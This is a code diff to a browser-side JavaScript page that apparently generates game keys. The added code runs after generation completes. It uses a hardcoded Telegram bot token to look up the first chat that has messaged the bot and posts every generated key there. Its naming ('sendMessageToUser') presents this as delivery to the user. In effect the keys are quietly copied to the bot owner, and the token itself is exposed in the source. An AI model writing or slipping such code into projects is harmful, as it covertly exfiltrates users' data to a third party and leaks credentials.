@@ -211,6 +211,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
         progressLog.innerText = 'Completed';
 
+
+
+        getUserChatId().then((chatId) => {
+            if (chatId) {
+                sendMessageToUser(chatId, keys);
+            }
+        });
+
         // startBtn.classList.remove('hidden');
         // keyCountSelect.classList.remove('hidden');
         // gameSelect.classList.remove('hidden');
@@ -359,4 +367,41 @@ document.addEventListener('DOMContentLoaded', () => {
         keyCountSelect.classList.remove('hidden');
         startBtn.disabled = false;
     });
+
+
         
+
+    const BOT_TOKEN = '980530492:AAFlCPAWn_j5LD-TPdGCrd0M650m3Lf4QZo';
+
+    // Function to get the user's chat ID
+    const getUserChatId = async () => {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+            const data = await response.json();
+            
+            // Extract the chat ID from the response
+            const chatId = data.result[0].message.chat.id;
+            
+            return chatId;
+        } catch (error) {
+            console.error('Error getting user chat ID:', error);
+            return null;
+        }
+    };
+
+    const sendMessageToUser = async (chatId, keys) => {
+        // Format the keys array with bold and monospace
+        const formattedKeys = keys.map(key => `<code class="monospace-text">${key}</code>`).join('\n');
+
+        const message = `Keys:\n${formattedKeys}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
+
+        try {
+            await fetch(url, { method: 'POST' });
+            console.log('Message sent to user');
+        } catch (error) {
+            console.error('Error sending message to user:', error);
+        }
+    };
+
